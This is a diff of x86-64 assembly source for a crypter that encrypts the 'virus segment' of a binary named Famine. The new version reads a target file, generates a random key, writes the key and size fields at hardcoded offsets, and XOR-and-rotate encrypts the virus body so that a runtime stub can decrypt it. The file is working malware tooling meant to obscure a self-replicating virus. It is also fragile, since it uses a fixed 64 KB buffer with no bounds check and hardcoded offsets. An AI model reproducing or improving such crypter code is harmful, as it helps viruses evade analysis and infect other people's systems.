@@ -1,9 +1,4 @@
-; ============================================
-; ENCRYPT - Standalone program to encrypt Famine binary
-; This program encrypts the virus segment of Famine using a random key
-; The key is stored in the binary and used for decryption at runtime
-; ============================================
-
+; Simple encryption program for Famine
 %define SYS_READ        0
 %define SYS_WRITE       1
 %define SYS_OPEN        2
@@ -11,446 +6,218 @@
 %define SYS_LSEEK       8
 %define SYS_EXIT        60
 %define SYS_GETRANDOM   318
-%define SYS_MMAP        9
-%define SYS_MUNMAP      11
 
 %define O_RDWR          2
 %define SEEK_SET        0
 %define SEEK_END        2
-%define GRND_NONBLOCK   1
-%define PROT_READ       1
-%define PROT_WRITE      2
-%define MAP_SHARED      1
 
 %define KEY_SIZE        16
 
 section .data
-    famine_path:        db "Famine", 0
-    msg_success:        db "Famine binary encrypted successfully!", 10, 0
-    msg_error:          db "Error encrypting Famine binary", 10, 0
-    msg_opening:        db "Opening Famine binary...", 10, 0
-    msg_generating:     db "Generating random key...", 10, 0
-    msg_encrypting:     db "Encrypting virus segment...", 10, 0
-    msg_writing:        db "Writing encrypted binary...", 10, 0
-    msg_key:            db "Encryption key: ", 0
-    newline:            db 10
+    msg_success:    db "Encrypted successfully", 10, 0
+    msg_error:      db "Error", 10, 0
+    msg_usage:      db "Usage: ./encrypt <filename>", 10, 0
 
 section .bss
-    key_buffer:         resb KEY_SIZE
-    elf_header:         resb 64
-    file_size:          resq 1
-    file_map:           resq 1
-    virus_start_addr:   resq 1
-    decrypt_end_addr:   resq 1
-    virus_end_addr:     resq 1
+    key_buffer:     resb KEY_SIZE
+    file_buffer:    resb 65536
+    file_size:      resq 1
+    filename_ptr:   resq 1
 
 section .text
 global _start
 
-; ============================================
-; Print string helper
-; rdi = string pointer
-; ============================================
-print_string:
+print_str:
     push rbp
     mov rbp, rsp
-    push rdi
-    push rsi
-    push rdx
-    
     mov rsi, rdi
     xor rdx, rdx
-.strlen_loop:
+.loop:
     cmp byte [rsi + rdx], 0
-    je .strlen_done
+    je .done
     inc rdx
-    jmp .strlen_loop
-.strlen_done:
-    mov eax, SYS_WRITE
+    jmp .loop
+.done:
+    mov eax, 1
     mov edi, 1
     syscall
-    
-    pop rdx
-    pop rsi
-    pop rdi
-    mov rsp, rbp
     pop rbp
     ret
 
-; ============================================
-; Print key in hex
-; ============================================
-print_key:
-    push rbp
-    mov rbp, rsp
-    
-    lea rdi, [rel msg_key]
-    call print_string
-    
-    ; Print each byte in hex
-    xor rcx, rcx
-.print_loop:
-    cmp rcx, KEY_SIZE
-    jge .print_done
-    
-    lea rsi, [rel key_buffer]
-    movzx eax, byte [rsi + rcx]
-    
-    ; Print high nibble
-    mov edx, eax
-    shr edx, 4
-    cmp edx, 10
-    jl .high_digit
-    add edx, 'A' - 10
-    jmp .high_print
-.high_digit:
-    add edx, '0'
-.high_print:
-    mov [rel newline], dl
-    mov eax, SYS_WRITE
-    mov edi, 1
-    lea rsi, [rel newline]
-    mov edx, 1
-    syscall
-    
-    ; Print low nibble  
-    lea rsi, [rel key_buffer]
-    movzx eax, byte [rsi + rcx]
-    and eax, 0xF
-    cmp eax, 10
-    jl .low_digit
-    add eax, 'A' - 10
-    jmp .low_print
-.low_digit:
-    add eax, '0'
-.low_print:
-    mov [rel newline], al
-    mov eax, SYS_WRITE
-    mov edi, 1
-    lea rsi, [rel newline]
-    mov edx, 1
-    syscall
-    
-    inc rcx
-    jmp .print_loop
-    
-.print_done:
-    mov byte [rel newline], 10
-    mov eax, SYS_WRITE
-    mov edi, 1
-    lea rsi, [rel newline]
-    mov edx, 1
-    syscall
-    
-    mov rsp, rbp
-    pop rbp
-    ret
-
-; ============================================
-; Generate random alphanumeric key
-; ============================================
 generate_key:
-    push rbp
-    mov rbp, rsp
-    
-    ; Generate random bytes using getrandom
-    mov eax, SYS_GETRANDOM
+    mov eax, 318
     lea rdi, [rel key_buffer]
     mov esi, KEY_SIZE
-    mov edx, GRND_NONBLOCK
+    xor edx, edx
     syscall
-    
-    test rax, rax
-    js .gen_error
-    
-    ; Convert bytes to alphanumeric characters
+    ; Convert to alphanumeric
     xor rcx, rcx
-.convert_loop:
+.loop:
     cmp rcx, KEY_SIZE
-    jge .gen_done
-    
+    jge .done
     lea rsi, [rel key_buffer]
     movzx eax, byte [rsi + rcx]
     xor rdx, rdx
     mov ebx, 62
     div ebx
-    
-    ; Map 0-9 -> '0'-'9', 10-35 -> 'A'-'Z', 36-61 -> 'a'-'z'
     cmp edx, 10
-    jl .is_digit
+    jl .digit
     cmp edx, 36
-    jl .is_upper
+    jl .upper
     sub edx, 36
     add edx, 'a'
-    jmp .store_char
-.is_upper:
+    jmp .store
+.upper:
     sub edx, 10
     add edx, 'A'
-    jmp .store_char
-.is_digit:
+    jmp .store
+.digit:
     add edx, '0'
-.store_char:
+.store:
     mov byte [rsi + rcx], dl
     inc rcx
-    jmp .convert_loop
-    
-.gen_done:
-    xor rax, rax
-    jmp .gen_exit
-.gen_error:
-    mov rax, -1
-.gen_exit:
-    mov rsp, rbp
-    pop rbp
+    jmp .loop
+.done:
     ret
 
-; ============================================
-; Encrypt buffer with XOR and rotation
-; rdi = buffer
-; rsi = buffer size
-; rdx = key
-; rcx = key size
-; ============================================
-xor_encrypt:
+encrypt_buffer:
+    ; rdi = buffer, rsi = size
     push rbp
     mov rbp, rsp
-    push rbx
-    push r12
-    push r13
-    push r14
-    
-    mov r12, rdi
-    mov r13, rsi
-    mov r14, rdx
-    
     xor rbx, rbx
     xor r8, r8
-    
-.encrypt_loop:
-    cmp rbx, r13
-    jge .encrypt_done
-    
-    ; Get current byte
-    mov al, [r12 + rbx]
-    
-    ; Get key byte
+.loop:
+    cmp rbx, rsi
+    jge .done
+    mov al, [rdi + rbx]
     mov rax, r8
     xor rdx, rdx
+    mov rcx, KEY_SIZE
     div rcx
-    mov r10b, [r14 + rdx]
-    
-    ; XOR with key
-    mov al, [r12 + rbx]
-    xor al, r10b
-    
-    ; Rotate left by 3
+    lea r10, [rel key_buffer]
+    mov r9b, [r10 + rdx]
+    mov al, [rdi + rbx]
+    xor al, r9b
     rol al, 3
-    
-    ; Store
-    mov [r12 + rbx], al
-    
+    mov [rdi + rbx], al
     inc rbx
     inc r8
-    jmp .encrypt_loop
-    
-.encrypt_done:
-    pop r14
-    pop r13
-    pop r12
-    pop rbx
-    mov rsp, rbp
+    jmp .loop
+.done:
     pop rbp
     ret
 
-; ============================================
-; Find symbol by searching for known patterns
-; We'll search for "virus_start:", "decrypt_end:", "virus_end:"
-; Returns offset in rax, -1 if not found
-; ============================================
-find_text_section:
-    push rbp
-    mov rbp, rsp
-    
-    ; For now, assume .text section starts at 0x1000 (standard for ld)
-    ; And the virus code starts there
-    mov rax, 0x1000
-    
-    mov rsp, rbp
-    pop rbp
-    ret
-
-; ============================================
-; Main program
-; ============================================
 _start:
-    lea rdi, [rel msg_opening]
-    call print_string
+    ; Check for command-line argument
+    ; Stack: [rsp] = argc, [rsp+8] = argv[0], [rsp+16] = argv[1]
+    pop rax             ; argc
+    cmp rax, 2
+    jne usage_error
     
-    ; Open Famine binary
-    mov eax, SYS_OPEN
-    lea rdi, [rel famine_path]
+    pop rax             ; argv[0] - discard
+    pop rax             ; argv[1] - filename
+    mov [rel filename_ptr], rax
+    
+    ; Open file
+    mov eax, 2
+    mov rdi, [rel filename_ptr]
     mov esi, O_RDWR
-    xor edx, edx
     syscall
-    
     test rax, rax
-    js .error
+    js error
     mov r12, rax
     
-    ; Get file size
-    mov eax, SYS_LSEEK
+    ; Get size
+    mov eax, 8
     mov edi, r12d
     xor esi, esi
-    mov edx, SEEK_END
+    mov edx, 2
     syscall
-    
-    test rax, rax
-    js .close_error
     mov [rel file_size], rax
     
-    ; mmap the file
-    mov eax, SYS_MMAP
-    xor edi, edi
-    mov rsi, [rel file_size]
-    mov edx, PROT_READ | PROT_WRITE
-    mov r10d, MAP_SHARED
-    mov r8d, r12d
-    xor r9d, r9d
+    ; Read file
+    mov eax, 8
+    mov edi, r12d
+    xor esi, esi
+    xor edx, edx
+    syscall
+    mov eax, 0
+    mov edi, r12d
+    lea rsi, [rel file_buffer]
+    mov rdx, [rel file_size]
     syscall
     
-    test rax, rax
-    js .close_error
-    mov [rel file_map], rax
-    
-    ; Find the .text section (virus code starts here)
-    ; For simplicity, we know it's at offset 0x1000
-    mov rbx, [rel file_map]
-    add rbx, 0x1000
-    mov [rel virus_start_addr], rbx
-    
-    ; Find specific markers in the code
-    ; Look for the encryption_key pattern (16 bytes of '0')
-    mov rdi, rbx
-    mov rsi, 1000           ; Search in first 1000 bytes
-    xor rcx, rcx
-.find_key_location:
-    cmp rcx, rsi
-    jge .key_not_found
-    
-    ; Check for 16 consecutive '0' characters
-    mov rdx, rcx
-    xor r8, r8
-.check_zeros:
-    cmp r8, 16
-    jge .found_key_location
-    cmp byte [rdi + rdx], '0'
-    jne .next_key_pos
-    inc rdx
-    inc r8
-    jmp .check_zeros
-    
-.next_key_pos:
-    inc rcx
-    jmp .find_key_location
-    
-.found_key_location:
-    ; rcx has the offset of encryption_key
-    add rbx, rcx
-    
     ; Generate key
-    lea rdi, [rel msg_generating]
-    call print_string
-    
     call generate_key
-    test rax, rax
-    jnz .unmap_error
     
-    call print_key
-    
-    ; Write key to binary
+    ; Write key to encryption_key location in buffer
+    ; encryption_key is at virus_start + 8 = 0x139b (0x1393 + 8)
+    lea rdi, [rel file_buffer]
+    add rdi, 0x139b
     lea rsi, [rel key_buffer]
     mov rcx, KEY_SIZE
-    mov rdi, rbx
 .write_key:
-    test rcx, rcx
-    jz .key_written
     mov al, [rsi]
     mov [rdi], al
     inc rsi
     inc rdi
     dec rcx
-    jmp .write_key
+    test rcx, rcx
+    jnz .write_key
     
-.key_written:
-    ; Set encrypted flag (1 byte after the key)
+    ; Set encrypted flag at virus_start + 24 = 0x13ab (0x1393 + 24 = 0x13ab)
     mov byte [rdi], 1
     
-    ; Now find decrypt_end by searching forward
-    ; It's roughly 150 bytes after virus_start for the decryption stub
-    mov rbx, [rel virus_start_addr]
-    add rbx, 200            ; Approximate offset to decrypt_end
-    mov [rel decrypt_end_addr], rbx
+    ; Write encrypted_offset at virus_start + 25 = 0x13ac
+    ; Store as offset from virus_start, not absolute file offset
+    ; virus_start = 0x1393, decrypt_code.end = 0x1570
+    ; offset_from_virus_start = 0x1570 - 0x1393 = 0x1dd
+    mov qword [rdi + 1], 0x1dd
     
-    ; Find virus_end (end of file minus some padding)
-    mov rax, [rel file_size]
-    mov rbx, [rel file_map]
-    add rbx, rax
-    sub rbx, 0x2000         ; Subtract .data and .bss sections
-    mov [rel virus_end_addr], rbx
+    ; Write encrypted_size at virus_start + 33 = 0x13b4
+    ; Size = 0x637 bytes
+    mov qword [rdi + 9], 0x637
     
-    ; Calculate size to encrypt
-    mov rax, [rel virus_end_addr]
-    mov rbx, [rel decrypt_end_addr]
-    sub rax, rbx
+    ; Encrypt from decrypt_code.end (0x1570) for 0x637 bytes
+    lea rdi, [rel file_buffer]
+    add rdi, 0x1570
+    mov rsi, 0x637
+    call encrypt_buffer
     
-    ; Encrypt the segment
-    lea rdi, [rel msg_encrypting]
-    call print_string
-    
-    mov rdi, [rel decrypt_end_addr]
-    mov rsi, rax            ; size
-    lea rdx, [rel key_buffer]
-    mov rcx, KEY_SIZE
-    call xor_encrypt
-    
-    ; Unmap and close
-    mov eax, SYS_MUNMAP
-    mov rdi, [rel file_map]
-    mov rsi, [rel file_size]
+    ; Write back
+    mov eax, 8
+    mov edi, r12d
+    xor esi, esi
+    xor edx, edx
+    syscall
+    mov eax, 1
+    mov edi, r12d
+    lea rsi, [rel file_buffer]
+    mov rdx, [rel file_size]
     syscall
     
-    mov eax, SYS_CLOSE
+    ; Close
+    mov eax, 3
     mov edi, r12d
     syscall
     
     lea rdi, [rel msg_success]
-    call print_string
+    call print_str
     
-    mov eax, SYS_EXIT
+    mov eax, 60
     xor edi, edi
     syscall
 
-.key_not_found:
-    ; If we can't find the key location, use a fixed offset
-    mov rbx, [rel virus_start_addr]
-    add rbx, 8              ; After original_entry_storage
-    jmp .found_key_location
-
-.unmap_error:
-    mov eax, SYS_MUNMAP
-    mov rdi, [rel file_map]
-    mov rsi, [rel file_size]
+usage_error:
+    lea rdi, [rel msg_usage]
+    call print_str
+    mov eax, 60
+    mov edi, 1
     syscall
 
-.close_error:
-    mov eax, SYS_CLOSE
-    mov edi, r12d
-    syscall
-    
-.error:
+error:
     lea rdi, [rel msg_error]
-    call print_string
-    
-    mov eax, SYS_EXIT
+    call print_str
+    mov eax, 60
     mov edi, 1
     syscall
